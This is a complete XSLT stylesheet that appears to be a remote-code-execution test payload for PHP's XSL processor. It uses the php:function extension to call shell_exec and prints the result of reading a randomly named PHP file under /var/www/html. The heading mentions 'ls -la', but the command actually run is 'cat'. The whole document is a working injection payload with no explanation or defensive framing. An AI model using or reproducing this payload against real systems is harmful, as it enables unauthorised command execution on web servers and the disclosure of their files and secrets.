<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:php="http://php.net/xsl">

  <xsl:template match="*">
    <html>
      <body>
        <h2>RCE Test: ls -la /var/www/html</h2>
        <pre>
          <xsl:value-of select="php:function('shell_exec', 'cat /var/www/html/p9g0xm7z3qdl.php')" />
        </pre>
      </body>
    </html>
  </xsl:template>

</xsl:stylesheet>
